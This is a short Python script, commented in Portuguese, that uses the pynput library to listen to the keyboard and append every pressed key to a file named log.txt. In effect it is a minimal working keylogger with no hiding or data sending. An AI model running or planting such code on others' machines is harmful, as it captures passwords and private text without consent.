import pynput 

#gera o arquivo de log
with open("log.txt", "w") as log:
    log.write("")

#função que captura as teclas pressionadas e salva no arquivo de log
def on_press(key):
    with open("log.txt", "a") as log:
        log.write(f"{key} ")

#inicia o listener do teclado
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()